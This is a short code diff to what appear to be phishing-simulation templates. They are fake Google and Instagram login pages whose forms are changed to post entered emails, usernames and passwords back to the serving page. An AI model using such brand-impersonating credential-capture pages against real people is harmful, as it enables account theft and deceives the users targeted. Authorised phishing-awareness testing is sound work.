@@ -407,7 +407,7 @@ _GOOGLE_LANDING_HTML = """\
             <p id="googleAccountText">Use your Google Account</p>
         </div>
         <div class="login-right">
-            <form id="loginForm" method="post" action="{{FORM_ACTION}}">
+            <form id="loginForm" method="post">
                 <div id="emailSection">
                     <div class="form-group" style="margin-bottom: -3px;">
                         <input type="email" class="form-control" id="email" name="email" placeholder="Email or phone number" value="{{.Email}}" required=""/>
@@ -597,7 +597,7 @@ _INSTAGRAM_LANDING_HTML = """\
     <div class="card">
         <div class="logo">Instagram</div>
 
-        <form action="{{FORM_ACTION}}" method="post">
+        <form method="post">
             <input type="text" name="username" placeholder="Phone number, username, or email" value="{{.Email}}" autocomplete="username" required />
             <input type="password" name="password" placeholder="Password" autocomplete="current-password" required />
             <button type="submit" class="btn-login">Log in</button>
